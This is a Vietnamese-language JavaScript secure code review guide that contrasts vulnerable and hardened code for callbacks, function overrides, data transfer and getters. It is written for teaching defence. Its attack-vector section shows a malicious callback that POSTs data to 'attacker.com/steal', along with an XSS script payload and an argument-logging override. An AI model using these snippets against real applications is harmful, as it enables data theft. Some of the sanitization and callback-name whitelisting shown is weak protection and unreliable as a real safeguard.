# Advanced Hacking Techniques - Code Review Best Practices

## 📋 Overview

Tài liệu này mô tả các kỹ thuật hack nâng cao và cách phòng chống trong code review, bao gồm: Callback, Override, Get, Data Transfer và các phương pháp bảo mật tương ứng.

## 🎯 1. Callback Functions

### 1.1. Purpose
Callback functions cho phép truyền function như một tham số, tạo ra tính linh hoạt nhưng cũng là điểm yếu bảo mật.

### 1.2. Vulnerable Example
```javascript
// ❌ BAD: Callback không được validate
window.dataCallback = function(data) {
    console.log('Data callback executed:', data);
    return data;
};

// Nguy hiểm: Callback có thể bị hijack
function processData(callback) {
    const data = getSensitiveData();
    return callback(data); // Không kiểm tra callback có an toàn không
}

// Hack: Inject malicious callback
processData(function(data) {
    // Steal data
    sendToAttacker(data);
    // Modify data
    data.forEach(item => item.title = 'HACKED: ' + item.title);
    return data;
});
```

### 1.3. Secure Implementation
```javascript
// ✅ GOOD: Validate callback trước khi sử dụng
function processData(callback) {
    // Validate callback
    if (typeof callback !== 'function') {
        throw new Error('Callback must be a function');
    }
    
    // Check if callback is in whitelist
    const allowedCallbacks = ['processUserData', 'processProductData'];
    if (!allowedCallbacks.includes(callback.name)) {
        throw new Error('Unauthorized callback function');
    }
    
    const data = getSensitiveData();
    return callback(data);
}
```

## 🔄 2. Function Override

### 2.1. Purpose
Function override cho phép thay thế behavior của function hiện có, có thể bị lạm dụng để thay đổi logic ứng dụng.

### 2.2. Vulnerable Example
```javascript
// ❌ BAD: Function có thể bị override
window.getData = function() {
    return mockData;
};

// Hack: Override function để thay đổi behavior
const originalGetData = window.getData;
window.getData = function() {
    const data = originalGetData();
    // Inject malicious code
    data.forEach(item => {
        item.title = 'OVERRIDE HACKED: ' + item.title;
        item.price = '0';
    });
    return data;
};
```

### 2.3. Secure Implementation
```javascript
// ✅ GOOD: Sử dụng Object.freeze để bảo vệ function
const dataManager = {
    getData: function() {
        return mockData;
    }
};

// Freeze object để không thể override
Object.freeze(dataManager);

// Hoặc sử dụng private scope
(function() {
    function getData() {
        return mockData;
    }
    
    // Chỉ expose function cần thiết
    window.publicAPI = {
        getData: getData
    };
})();
```

## 📥 3. Data Transfer

### 3.1. Purpose
Data transfer là quá trình truyền dữ liệu giữa các component, có thể bị lạm dụng để inject dữ liệu độc hại.

### 3.2. Vulnerable Example
```javascript
// ❌ BAD: Không validate dữ liệu transfer
window.transferData = function(newData) {
    mockData = newData; // Nguy hiểm: Gán trực tiếp
    console.log('Data transferred:', newData);
    return 'Data transferred successfully';
};

// Hack: Transfer malicious data
transferData([
    {id: 666, title: 'MALICIOUS DATA', price: '999999', category: 'HACK'}
]);
```

### 3.3. Secure Implementation
```javascript
// ✅ GOOD: Validate và sanitize dữ liệu
window.transferData = function(newData) {
    // Validate input
    if (!Array.isArray(newData)) {
        throw new Error('Data must be an array');
    }
    
    // Validate each item
    const validatedData = newData.map(item => {
        if (!item.id || !item.title) {
            throw new Error('Invalid data structure');
        }
        
        // Sanitize data
        return {
            id: parseInt(item.id),
            title: sanitizeInput(item.title),
            price: parseFloat(item.price) || 0,
            category: sanitizeInput(item.category || 'Unknown')
        };
    });
    
    mockData = validatedData;
    console.log('Data transferred safely:', validatedData);
    return 'Data transferred successfully';
};
```

## 🔍 4. Getter Functions

### 4.1. Purpose
Getter functions truy cập dữ liệu, có thể bị lạm dụng để leak thông tin nhạy cảm.

### 4.2. Vulnerable Example
```javascript
// ❌ BAD: Getter trả về toàn bộ dữ liệu
function getUserData(userId) {
    return users.find(user => user.id === userId);
}

// Hack: Access sensitive data
const userData = getUserData(1);
console.log('Password hash:', userData.passwordHash); // Leak sensitive data
```

### 4.3. Secure Implementation
```javascript
// ✅ GOOD: Chỉ trả về dữ liệu cần thiết
function getUserData(userId) {
    const user = users.find(user => user.id === userId);
    if (!user) return null;
    
    // Chỉ trả về dữ liệu public
    return {
        id: user.id,
        name: user.name,
        email: user.email,
        // Không trả về password, token, etc.
    };
}

// Hoặc sử dụng whitelist
function getUserData(userId, fields = []) {
    const allowedFields = ['id', 'name', 'email', 'avatar'];
    const requestedFields = fields.filter(field => allowedFields.includes(field));
    
    const user = users.find(user => user.id === userId);
    if (!user) return null;
    
    return requestedFields.reduce((result, field) => {
        result[field] = user[field];
        return result;
    }, {});
}
```

## 🛡️ 5. Security Best Practices

### 5.1. Input Validation
```javascript
// ✅ GOOD: Validate tất cả input
function validateInput(input, type) {
    switch(type) {
        case 'string':
            return typeof input === 'string' && input.length > 0;
        case 'number':
            return typeof input === 'number' && !isNaN(input);
        case 'array':
            return Array.isArray(input);
        default:
            return false;
    }
}
```

### 5.2. Function Whitelisting
```javascript
// ✅ GOOD: Chỉ cho phép function được phép
const allowedFunctions = {
    'processUserData': true,
    'processProductData': true,
    'validateInput': true
};

function executeFunction(functionName, ...args) {
    if (!allowedFunctions[functionName]) {
        throw new Error('Unauthorized function');
    }
    
    return window[functionName](...args);
}
```

### 5.3. Data Sanitization
```javascript
// ✅ GOOD: Sanitize dữ liệu trước khi sử dụng
function sanitizeInput(input) {
    if (typeof input !== 'string') return '';
    
    return input
        .replace(/[<>]/g, '') // Remove HTML tags
        .replace(/javascript:/gi, '') // Remove javascript: protocol
        .replace(/on\w+=/gi, '') // Remove event handlers
        .trim();
}
```

### 5.4. Access Control
```javascript
// ✅ GOOD: Kiểm soát quyền truy cập
function checkPermission(userId, action) {
    const user = getUserById(userId);
    if (!user) return false;
    
    const permissions = {
        'admin': ['read', 'write', 'delete'],
        'user': ['read'],
        'guest': []
    };
    
    return permissions[user.role]?.includes(action) || false;
}
```

## 🚨 6. Common Attack Vectors

### 6.1. Callback Hijacking
```javascript
// Attack: Hijack callback để steal data
const maliciousCallback = function(data) {
    // Send data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    return data;
};

// Inject vào ứng dụng
processData(maliciousCallback);
```

### 6.2. Function Override
```javascript
// Attack: Override function để thay đổi behavior
const originalFunction = window.importantFunction;
window.importantFunction = function(...args) {
    // Log sensitive data
    console.log('Sensitive args:', args);
    
    // Call original function
    return originalFunction.apply(this, args);
};
```

### 6.3. Data Injection
```javascript
// Attack: Inject malicious data
const maliciousData = {
    id: 1,
    title: '<script>alert("XSS")</script>',
    price: '0',
    category: 'HACK'
};

// Inject vào hệ thống
transferData([maliciousData]);
```

## 📝 7. Code Review Checklist

### 7.1. Callback Functions
- [ ] Callback có được validate không?
- [ ] Có whitelist các callback được phép không?
- [ ] Callback có thể access sensitive data không?

### 7.2. Function Override
- [ ] Function có được bảo vệ khỏi override không?
- [ ] Có sử dụng Object.freeze() không?
- [ ] Function có trong private scope không?

### 7.3. Data Transfer
- [ ] Dữ liệu có được validate trước khi transfer không?
- [ ] Có sanitize dữ liệu không?
- [ ] Có kiểm tra quyền truy cập không?

### 7.4. Getter Functions
- [ ] Chỉ trả về dữ liệu cần thiết không?
- [ ] Có filter sensitive data không?
- [ ] Có sử dụng whitelist fields không?

## 🎯 8. Testing Scenarios

### 8.1. Callback Testing
```javascript
// Test: Inject malicious callback
const testCallback = function(data) {
    data.forEach(item => item.hacked = true);
    return data;
};

// Should be blocked by validation
try {
    processData(testCallback);
    console.log('❌ Security vulnerability found!');
} catch (error) {
    console.log('✅ Security check passed');
}
```

### 8.2. Override Testing
```javascript
// Test: Try to override function
const originalFunction = window.getData;
window.getData = function() {
    return 'HACKED';
};

// Should still work correctly
const data = window.getData();
if (data === 'HACKED') {
    console.log('❌ Function override vulnerability found!');
} else {
    console.log('✅ Function protection working');
}
```

### 8.3. Data Transfer Testing
```javascript
// Test: Transfer malicious data
const maliciousData = [
    {id: 1, title: '<script>alert("XSS")</script>', price: '0'}
];

try {
    transferData(maliciousData);
    // Check if data was sanitized
    const data = getData();
    if (data[0].title.includes('<script>')) {
        console.log('❌ Data sanitization failed!');
    } else {
        console.log('✅ Data sanitization working');
    }
} catch (error) {
    console.log('✅ Data validation working');
}
```

## 📚 9. References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Code Review Security Guidelines](https://owasp.org/www-project-code-review-guide/)

## 🔒 10. Conclusion

Các kỹ thuật hack nâng cao như Callback, Override, Get, Data Transfer đều có thể bị lạm dụng để tấn công ứng dụng. Việc hiểu rõ các kỹ thuật này và áp dụng các biện pháp bảo mật phù hợp là rất quan trọng trong code review.

**Key Takeaways:**
- Luôn validate input và callback functions
- Sử dụng Object.freeze() để bảo vệ functions
- Sanitize dữ liệu trước khi transfer
- Chỉ expose dữ liệu cần thiết
- Implement proper access control
- Test security scenarios thường xuyên

